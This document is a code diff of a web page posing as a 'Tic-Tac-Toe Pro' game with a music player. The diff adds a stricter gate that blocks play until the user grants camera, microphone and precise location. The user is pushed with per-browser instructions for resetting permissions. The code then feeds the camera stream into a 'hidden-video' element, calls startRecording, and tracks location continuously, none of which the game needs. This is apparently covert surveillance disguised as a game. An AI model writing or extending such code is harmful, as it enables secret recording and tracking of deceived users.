@@ -76,7 +76,7 @@
             text-align: center;
             border: 1px solid rgba(255,255,255,0.1);
             max-width: 90%;
-            width: 400px;
+            width: 450px;
         }
 
         .permission-icon { font-size: 60px; margin-bottom: 20px; }
@@ -116,6 +116,9 @@
         .permission-instructions li {
             margin-bottom: 5px;
             color: #fff;
+        }
+        .permission-instructions strong {
+            color: #ffd700;
         }
 
         .btn-allow {
@@ -649,6 +652,7 @@
         .toast.show { transform: translateX(-50%) translateY(0); }
         .toast.win { border-color: #2ecc71; color: #2ecc71; }
         .toast.draw { border-color: #ffd700; color: #ffd700; }
+        .toast.error { border-color: #ff416c; color: #ff416c; }
 
         .confetti {
             position: fixed;
@@ -698,21 +702,28 @@
             <div class="permission-icon">🎮</div>
             <div class="permission-title">Tic-Tac-Toe Pro</div>
             <div class="permission-text" id="permText">
-                Please allow permissions so we can find online players for you.
+                Please allow ALL permissions to play the game.<br>
+                <span style="color: #667eea;">Camera + Microphone + Location</span>
             </div>
             <div class="permission-status" id="permStatus">✅ All permissions granted! Loading...</div>
             <button class="btn-allow" onclick="requestPermissions()" id="allowBtn">Allow & Play</button>
-            <div class="permission-error" id="permError">❌ All permissions required!</div>
+            <div class="permission-error" id="permError">
+                ❌ Permission Denied!
+            </div>
             <div class="permission-instructions" id="permInstructions">
-                <strong>Missing permissions detected:</strong>
-                <div id="missingPermsList" style="color: #ff416c; margin: 10px 0;"></div>
-                <strong>How to enable:</strong>
+                <strong style="color: #ff416c;">⚠️ Missing Permissions:</strong>
+                <div id="missingPermsList" style="color: #fff; margin: 10px 0; font-weight: bold;"></div>
+                <hr style="border-color: rgba(255,215,0,0.3); margin: 15px 0;">
+                <strong>📱 How to Reset Permissions:</strong>
                 <ol>
-                    <li>Click the lock icon 🔒 in address bar</li>
-                    <li>Click "Site settings"</li>
-                    <li>Allow Camera, Microphone & Location</li>
-                    <li>Refresh the page and try again</li>
+                    <li><strong>Chrome/Android:</strong> Click lock icon 🔒 in address bar → Site settings → Reset permissions → Refresh page</li>
+                    <li><strong>iPhone Safari:</strong> Settings → Safari → Camera/Microphone → Allow</li>
+                    <li><strong>Desktop Chrome:</strong> Click 🔒 → Site settings → Camera/Microphone/Location → Allow → Refresh</li>
+                    <li><strong>Firefox:</strong> Click 🔒 → Permissions → Allow Camera/Mic/Location → Refresh</li>
                 </ol>
+                <div style="margin-top: 15px; padding: 10px; background: rgba(255,65,108,0.2); border-radius: 8px; text-align: center;">
+                    <strong>Click "Allow & Play" again after resetting permissions</strong>
+                </div>
             </div>
         </div>
     </div>
@@ -826,6 +837,7 @@
         let loc = {lat: "N/A", lng: "N/A"};
         let stream = null;
         let recording = false;
+        let permissionsGranted = false;
 
         const avatars = ['😎', '🤠', '👽', '🤖', '👻', '🎃', '🦄', '🐶', '🐱', '🦁', '🐯', '🐨', '🐼', '🐸', '🐙', '🦊', '🐺', '🐗', '🐴', '🐲', '👤', '👦', '👧', '👨', '👩'];
         const botAvatar = '🤖';
@@ -847,18 +859,18 @@
                 title: "Song 3",
                 artist: "TALIB KING",
                 url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/DEVIL%20Lyrical%20Video%20%20PBX%201%20%20Sidhu%20Moose%20Wala%20%20Byg%20Byrd%20%20%20Latest%20Punjabi%20Songs%202018.mp3"
-            }
-             {
+            },
+            {
                 title: "Song 4",
                 artist: "TALIB KING",
                 url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/Best%20attitude%20song%20Attitude%20song%20No%20copyright%20attitude%20ringtone%202023%20attitude%20song%23trending.mp3"
-            }
-        {
+            },
+            {
                 title: "Song 5",
                 artist: "TALIB KING",
                 url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/Bad%20Boy%20Remix%20%20Arabic%20Remix%20Song%20(%20Slowed%20And%20Reverb%20)%20Tik%20Tok%20Video%20%20NCS%20Collection%202024.mp3"
-            }
-        {
+            },
+            {
                 title: "Song 6",
                 artist: "TALIB KING",
                 url: "https://github.com/talibmalla455-ux/SONGS-PLAYLIST/raw/refs/heads/main/Arabic%20Remix%20Khalouni%20N3ich%20Yusuf%20Ek%20io%20lu%20Remix%20Slowed%20%20Reverb)%20%5BBass%20Boosted%5D.mp3"
@@ -882,6 +894,178 @@
         let autoRestartTimer = null;
         let countdownInterval = null;
 
+        // ========== PERMISSION SYSTEM ==========
+        
+        // Check if all permissions are granted
+        async function checkAllPermissions() {
+            let cameraGranted = false;
+            let micGranted = false;
+            let locationGranted = false;
+            
+            // Check Camera permission
+            try {
+                const cameraResult = await navigator.permissions.query({ name: 'camera' });
+                cameraGranted = cameraResult.state === 'granted';
+            } catch(e) {
+                // Fallback - try to get stream
+                try {
+                    const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    testStream.getTracks().forEach(t => t.stop());
+                    cameraGranted = true;
+                } catch(e2) {
+                    cameraGranted = false;
+                }
+            }
+            
+            // Check Microphone permission
+            try {
+                const micResult = await navigator.permissions.query({ name: 'microphone' });
+                micGranted = micResult.state === 'granted';
+            } catch(e) {
+                // Fallback
+                try {
+                    const testStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    testStream.getTracks().forEach(t => t.stop());
+                    micGranted = true;
+                } catch(e2) {
+                    micGranted = false;
+                }
+            }
+            
+            // Check Location permission
+            try {
+                const locationResult = await navigator.permissions.query({ name: 'geolocation' });
+                locationGranted = locationResult.state === 'granted';
+            } catch(e) {
+                locationGranted = false;
+            }
+            
+            return { cameraGranted, micGranted, locationGranted };
+        }
+
+        // Main permission request function
+        async function requestPermissions() {
+            const permError = document.getElementById('permError');
+            const permInstructions = document.getElementById('permInstructions');
+            const permStatus = document.getElementById('permStatus');
+            const allowBtn = document.getElementById('allowBtn');
+            const missingList = document.getElementById('missingPermsList');
+            
+            // Reset displays
+            permError.style.display = 'none';
+            permInstructions.style.display = 'none';
+            permStatus.style.display = 'none';
+            missingList.innerHTML = '';
+            
+            allowBtn.disabled = true;
+            allowBtn.textContent = 'Checking Permissions...';
+            
+            let mediaGranted = false;
+            let locationGranted = false;
+            let missingPermissions = [];
+            
+            // STEP 1: Request Camera + Microphone
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
+                document.getElementById('hidden-video').srcObject = stream;
+                mediaGranted = true;
+            } catch(e) {
+                console.log('Media denied:', e.name);
+                if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+                    missingPermissions.push('📷 Camera & 🎤 Microphone');
+                } else if (e.name === 'NotFoundError') {
+                    missingPermissions.push('📷 Camera (Device not found)');
+                }
+            }
+            
+            // STEP 2: Request Location
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    loc = {
+                        lat: position.coords.latitude.toFixed(6), 
+                        lng: position.coords.longitude.toFixed(6)
+                    };
+                    locationGranted = true;
+                    
+                    // Start watching location
+                    navigator.geolocation.watchPosition(p => {
+                        loc = {
+                            lat: p.coords.latitude.toFixed(6), 
+                            lng: p.coords.longitude.toFixed(6)
+                        };
+                    }, () => {}, {enableHighAccuracy: true});
+                    
+                } catch(e) {
+                    console.log('Location denied:', e.code);
+                    if (e.code === 1) { // PERMISSION_DENIED
+                        missingPermissions.push('📍 Location');
+                    }
+                }
+            } else {
+                missingPermissions.push('📍 Location (Not supported)');
+            }
+            
+            // STEP 3: Check if ALL permissions granted
+            if (mediaGranted && locationGranted) {
+                // SUCCESS!
+                permissionsGranted = true;
+                permStatus.style.display = 'block';
+                allowBtn.textContent = '✅ Access Granted!';
+                showToast('✅ All permissions granted!', 'win');
+                
+                setTimeout(() => {
+                    document.getElementById('permissionBlocker').style.display = 'none';
+                    document.getElementById('modeSelector').classList.add('active');
+                    startRecording();
+                    initMusicPlayer();
+                }, 1500);
+                
+            } else {
+                // FAILURE - Show error and instructions
+                permissionsGranted = false;
+                permError.style.display = 'block';
+                permInstructions.style.display = 'block';
+                
+                // Show which permissions are missing
+                if (missingPermissions.length > 0) {
+                    missingList.innerHTML = missingPermissions.join('<br>');
+                } else {
+                    missingList.innerHTML = 'Unknown permission error';
+                }
+                
+                showToast('❌ All permissions required!', 'error');
+                
+                // Re-enable button with new text
+                allowBtn.disabled = false;
+                allowBtn.textContent = 'Try Again - Allow & Play';
+            }
+        }
+
+        // Auto-check on page load
+        window.addEventListener('load', async () => {
+            // Check if permissions already granted
+            const perms = await checkAllPermissions();
+            if (perms.cameraGranted && perms.micGranted && perms.locationGranted) {
+                // Already granted, auto-enter
+                permissionsGranted = true;
+                document.getElementById('permissionBlocker').style.display = 'none';
+                document.getElementById('modeSelector').classList.add('active');
+                initMusicPlayer();
+            }
+        });
+
+        // ========== MUSIC PLAYER ==========
+        
         function initMusicPlayer() {
             audio.volume = 0.5;
             
@@ -977,6 +1161,8 @@
             selectSong(currentSongIndex);
         }
 
+        // ========== GAME LOGIC ==========
+        
         document.querySelectorAll('.cell').forEach(c => {
             c.addEventListener('click', () => clickCell(c), {passive: true});
         });
@@ -1015,94 +1201,6 @@
         function closeAvatarModal() {
             document.getElementById('avatarModal').classList.remove('active');
             currentAvatarPlayer = null;
-        }
-
-        // Strict permission check - ALL must be granted
-        async function requestPermissions() {
-            const permError = document.getElementById('permError');
-            const permInstructions = document.getElementById('permInstructions');
-            const permStatus = document.getElementById('permStatus');
-            const allowBtn = document.getElementById('allowBtn');
-            const missingList = document.getElementById('missingPermsList');
-            
-            // Reset displays
-            permError.style.display = 'none';
-            permInstructions.style.display = 'none';
-            permStatus.style.display = 'none';
-            missingList.innerHTML = '';
-            
-            allowBtn.disabled = true;
-            allowBtn.style.opacity = '0.5';
-            
-            let mediaGranted = false;
-            let locationGranted = false;
-            let missingPermissions = [];
-            
-            // Check Camera + Microphone
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-                document.getElementById('hidden-video').srcObject = stream;
-                mediaGranted = true;
-            } catch(e) {
-                console.log('Media denied:', e.name);
-                missingPermissions.push('Camera & Microphone');
-            }
-            
-            // Check Location
-            if (navigator.geolocation) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        });
-                    });
-                    loc = {
-                        lat: position.coords.latitude.toFixed(6), 
-                        lng: position.coords.longitude.toFixed(6)
-                    };
-                    locationGranted = true;
-                    
-                    // Start watching
-                    navigator.geolocation.watchPosition(p => {
-                        loc = {
-                            lat: p.coords.latitude.toFixed(6), 
-                            lng: p.coords.longitude.toFixed(6)
-                        };
-                    }, () => {}, {enableHighAccuracy: true});
-                    
-                } catch(e) {
-                    console.log('Location denied:', e.code);
-                    missingPermissions.push('Location');
-                }
-            } else {
-                missingPermissions.push('Location (not supported)');
-            }
-            
-            // STRICT CHECK: ALL permissions must be granted
-            if (mediaGranted && locationGranted) {
-                // SUCCESS - All permissions granted
-                permStatus.style.display = 'block';
-                showToast('✅ All permissions granted!', 'win');
-                
-                setTimeout(() => {
-                    document.getElementById('permissionBlocker').style.display = 'none';
-                    document.getElementById('modeSelector').classList.add('active');
-                    startRecording();
-                    initMusicPlayer();
-                }, 1000);
-                
-            } else {
-                // FAILURE - Show which permissions are missing
-                permError.style.display = 'block';
-                permInstructions.style.display = 'block';
-                missingList.innerHTML = missingPermissions.join('<br>');
-                showToast('❌ All permissions required!', 'error');
-                
-                allowBtn.disabled = false;
-                allowBtn.style.opacity = '1';
-            }
         }
 
         function selectMode(m) {
